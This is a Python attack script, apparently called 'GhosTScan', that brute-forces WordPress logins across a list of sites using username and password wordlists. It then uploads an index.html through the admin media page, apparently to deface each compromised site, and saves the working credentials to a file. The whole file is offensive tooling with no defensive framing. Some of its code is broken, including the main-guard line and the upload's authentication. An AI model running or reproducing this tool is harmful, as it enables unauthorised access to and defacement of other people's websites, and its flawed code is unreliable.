import os
import sys
import requests

def load_file(file_path):
    """Loads a file and returns its lines as a list."""
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def attempt_login(url, username, password):
    """Attempts to login to the WordPress site with the given credentials."""
    login_url = f"{url}/wp-login.php"
    data = {'log': username, 'pwd': password}
    try:
        response = requests.post(login_url, data=data, timeout=10)
        if "Dashboard" in response.text or "dashboard" in response.text:
            return True
    except requests.RequestException:
        pass
    return False

def upload_index(url, username, password):
    """Uploads the index file if login is successful."""
    if attempt_login(url, username, password):
        index_file = 'index.html'  # Name of the index file
        with open(index_file, 'rb') as file:
            files = {'file': (os.path.basename(index_file), file)}
            upload_url = f"{url}/wp-admin/media-new.php"
            try:
                response = requests.post(upload_url, files=files, auth=(username, password))
                if response.status_code == 200:
                    return True
            except requests.RequestException:
                pass
    return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python GhosTScan.py <wp_list> <result_file>")
        sys.exit(1)
    
    wp_list_file = sys.argv[1]
    result_file = sys.argv[2]
    
    wp_list = load_file(wp_list_file)
    usernames = load_file('username.txt')
    passwords = load_file('password.txt')
    
    success_results = []
    
    for wp_url in wp_list:
        for username in usernames:
            for password in passwords:
                print(f"[*] Trying {wp_url} with {username}/{password}")
                if upload_index(wp_url, username, password):
                    print(f"[+] Success: {wp_url} with {username}/{password}")
                    success_results.append(f"{wp_url} - {username}/{password}")
                    break
                else:
                    print(f"[-] Failed: {wp_url} with {username}/{password}")
    
    with open(result_file, 'w') as file:
        for result in success_results:
            file.write(result + "\n")
    
    print(f"[+] Results saved to {result_file}")

if name == 'main':
    main()
